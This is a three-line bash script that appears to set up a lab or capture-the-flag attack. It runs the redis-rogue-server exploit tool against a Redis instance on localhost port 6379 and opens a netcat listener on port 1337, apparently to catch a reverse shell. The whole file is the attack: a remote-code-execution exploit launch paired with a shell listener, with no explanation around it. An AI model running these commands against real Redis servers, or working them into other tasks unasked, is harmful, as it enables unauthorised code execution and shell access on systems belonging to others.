#!/bin/bash
python3 /redis-rogue-server.py --rhost 127.0.0.1 --rport 6379 --lhost 127.0.0.1 --lport 8888 &
nc -lv 1337
